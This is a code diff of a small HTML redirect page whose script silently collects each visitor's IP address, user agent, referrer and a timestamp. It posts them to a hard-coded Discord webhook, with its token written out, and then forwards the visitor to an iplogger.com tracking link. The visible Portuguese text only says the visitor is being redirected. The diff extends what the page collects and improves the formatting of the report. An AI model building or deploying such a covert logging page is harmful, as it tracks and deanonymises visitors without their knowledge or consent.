@@ -8,18 +8,33 @@
         async function logAndRedirect() {
             const webhookUrl = "https://discord.com/api/webhooks/1256806087521341492/bXa1GxUTO67hu5AZVsIBQeFBn_x_onurU_aVEdmqRHvHNf2zKg2uy7TcYjtSl53yz_5g";
             const userAgent = navigator.userAgent;
+            const referrer = document.referrer || "No referrer";
+            const timestamp = new Date().toISOString();
+
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const ipAddress = ipData.ip;
 
-            const logMessage = `${userAgent} : ${ipAddress}`;
-            
+            const logMessage = {
+                username: "Logger",
+                embeds: [{
+                    title: "Visitor Log",
+                    color: 15158332,
+                    fields: [
+                        { name: "User Agent", value: userAgent, inline: false },
+                        { name: "IP Address", value: ipAddress, inline: false },
+                        { name: "Referrer", value: referrer, inline: false },
+                        { name: "Timestamp", value: timestamp, inline: false }
+                    ]
+                }]
+            };
+
             await fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ content: logMessage })
+                body: JSON.stringify(logMessage)
             });
 
             window.location.href = "https://iplogger.com/2lY8J3";
@@ -29,6 +44,6 @@
     </script>
 </head>
 <body>
-    <p>Se você não foi redirecionado clicke aqui -> <a href="https://iplogger.com/2lY8J3">Link</a>.</p>
+    <p>Se você não foi redirecionado clicke neste <a href="https://iplogger.com/2lY8J3">link</a>.</p>
 </body>
 </html>
